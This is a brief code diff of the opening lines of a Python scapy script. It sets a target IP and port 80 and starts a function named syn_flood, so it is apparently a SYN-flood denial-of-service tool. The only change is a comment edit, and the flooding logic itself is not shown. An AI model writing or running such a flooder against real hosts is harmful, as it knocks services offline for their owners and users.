@@ -1,7 +1,7 @@
 from scapy.all import *
 import random
 
-target_ip = "10.222.7.213" ##target ip 
+target_ip = "10.222.7.213" #target ip 
 target_port = 80
 
 def syn_flood():
